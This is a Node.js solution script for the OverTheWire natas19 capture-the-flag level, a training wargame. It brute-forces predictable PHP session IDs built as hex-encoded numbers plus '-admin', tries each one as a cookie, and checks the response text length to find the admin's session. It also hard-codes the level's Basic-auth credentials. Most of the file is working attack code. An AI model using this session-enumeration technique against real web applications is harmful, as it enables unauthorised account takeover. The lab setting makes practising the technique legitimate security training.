/*
  admin, s********: 313838.2d61646d696e
  admin, dadada: 313234.2d61646d696e
  admin, dadadb: 343939.2d61646d696e
  admin, moha123: 3930.2d61646d696e
  admin, .: 313836.2d61646d696e
  admin, kalepook6d: 323930.2d61646d696e

  there is a pattern in created sessions!
*/

const request = require("request")
const { parse } = require("node-html-parser")

const url = "http://natas19.natas.labs.overthewire.org/index.php"

async function serveRequest(sid) {
  return new Promise((res, rej) => {
    request.post(
      {
        url: url,
        headers: {
          Cookie: `PHPSESSID=${sid}`,
          Authorization:
            "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==",
        },
      },
      function optionalCallback(err, httpResponse, body) {
        if (err) {
          console.log(err)
          res(-1)
        }
        res(body)
      }
    )
  })
}

function getUserType(htmlStr) {
  function getMessage() {
    const root = parse(htmlStr)
    return root.querySelector("#content").text
  }
  const resText = getMessage()
  if (resText.length === 227) {
    return -1 // do log in
  } else if (resText.length === 205) {
    return 0 // regular user
  } else {
    return 1 // probably admin user
  }
}

function createNextNumberSequence(arr) {
  for (var i = arr.length - 1; i >= 0; i--) {
    if (arr[i] === 9) {
      arr[i] = 0
    } else {
      arr[i]++
      return arr
    }
  }
  return -1
}

;(async function () {
  let dynamicDigits = [2, 3]

  let counter = 0
  for (var dd of dynamicDigits) {
    var numberSeq = []
    for (let i = 0; i < dd; i++) {
      numberSeq.push(0)
    }

    for (; numberSeq !== -1; counter++) {
      let sessionFirstPart = ""
      for (var j = 0; j < dd; j++) {
        sessionFirstPart = sessionFirstPart + "3" + numberSeq[j]
      }

      numberSeq = createNextNumberSequence(numberSeq)

      const createdSessionId = sessionFirstPart + "2d61646d696e"
      const r = await serveRequest(createdSessionId)
      const userType = getUserType(r)

      console.log(
        `checking (${counter}/1000) :: ${createdSessionId} | userType: ${userType}`
      )

      if (userType === 1) {
        console.log("session is found : ", createdSessionId)
        console.log(r)
        return
      }
    }
  }
})()
